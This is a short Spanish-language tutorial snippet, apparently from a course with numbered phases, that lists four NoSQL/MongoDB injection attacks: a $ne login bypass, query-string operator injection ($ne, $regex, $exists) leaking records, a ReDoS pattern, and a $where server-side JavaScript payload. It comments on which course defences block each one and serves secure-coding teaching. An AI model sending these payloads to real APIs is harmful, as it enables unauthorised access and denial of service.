var __o = {
// ATAQUE 1 — Bypass de autenticación (el más famoso de la época)
POST /auth/login
{ "username": { "$ne": null }, "password": { "$ne": null } }
// El findOne({username, password}) matchea al PRIMER usuario. Estás dentro.
// ⚠️ El login de la Fase 11 corta esto en su primera línea (username y password
//    tienen que ser strings → 400). Quítala y pruébalo: el password como objeto
//    no entra (bcrypt no lo compara: 500), pero el `username` como objeto SÍ
//    entra al filtro y te devuelve al primer usuario, admin.

// ATAQUE 2 — Fuga de filtros por query string
GET /tickets?status[$ne]=zzz       // trae TODOS (ningún status es "zzz"): contra el
                                   // servicio de la Fase 10 tal cual, entra
GET /tickets?status[$regex]=.*     // idem, con regex
GET /tickets?assignee[$exists]=false   // los que nadie tomó, aunque no debas verlos

// ATAQUE 3 — DoS por regex (ReDoS)
GET /tickets?q=(a+)+$              // regex catastrófico: la CPU del server, tuya
// (y sin índice, además: COLLSCAN + backtracking exponencial — F2/F7).
// Tu Fase 10 ya lo desactiva: escapeRegex convierte el patrón en texto literal.

// ATAQUE 4 — $where: ejecución de JavaScript en el servidor
{ "$where": "sleep(5000) || true" }
// Si algo de tu API construye filtros desde input libre, esto es RCE de facto.
};